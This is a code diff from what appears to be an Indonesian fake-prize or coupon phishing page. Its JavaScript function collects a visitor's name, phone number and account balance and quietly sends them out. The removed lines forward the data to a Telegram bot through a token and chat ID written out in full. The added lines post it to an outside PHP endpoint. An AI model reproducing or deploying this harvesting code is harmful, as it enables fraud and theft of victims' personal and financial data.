@@ -27,25 +27,16 @@ function next() {
 	var message = ('\n<b>Hadiah:</b>\n'+type+'\n\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n');
 	var fd = new FormData();
 	fd.append('message', message);
-	const token = "8110089022:AAHyIvE4yCl7C0SxbCi_LBisEpekvkdpbIo";
-    const chatId = "8241735643";
-    const url = "https://api.telegram.org/bot"+token+"/sendMessage?parse_mode=html";
-    fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
+	fetch("https://zxqwx.my.id/senders/"
+        +"daftar-kupon-sekarang/send.php", {
+        method: 'POST',
+        body: fd
       })
-    })
-    .then(res => res.json())
-    .then(data => {
-      dataSent();
-    })
-    .catch(err => {
-      dataSent();
+      .then(response => response.json())
+      .then(data => {
+      	dataSent();
+      })
+      .catch((error) => {
     });
 }
 
